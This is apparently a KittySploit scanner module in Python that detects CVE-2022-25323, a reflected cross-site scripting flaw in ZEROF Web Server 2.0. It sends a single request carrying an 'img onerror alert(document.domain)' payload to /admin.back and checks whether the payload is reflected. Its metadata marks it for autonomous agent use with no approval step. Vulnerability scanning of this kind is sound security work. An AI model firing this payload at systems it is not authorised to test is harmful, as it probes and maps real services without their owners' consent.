#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZEROF Web Server 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ZEROF Web Server 2.0 - Cross-Site Scripting Detection',
        'description': 'ZEROF Web Server 2.0 allows /admin.back cross-site scripting.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'zerof', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/awillix/research/blob/main/cve/CVE-2022-25323.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-25323',
            'https://awillix.ru',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/awillix/research',
        ],
        'cve': 'CVE-2022-25323',
    }

    def run(self):
        r = self.http_request(method="GET", path='/admin.back<img%20src=x%20onerror=alert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 401:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('back<img src=x onerror=alert(document.domain)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="ZEROF Web Server 2.0 - Cross-Site Scripting detected",
                path='/admin.back<img%20src=x%20onerror=alert(document.domain)>',
            )
            return True
        return False

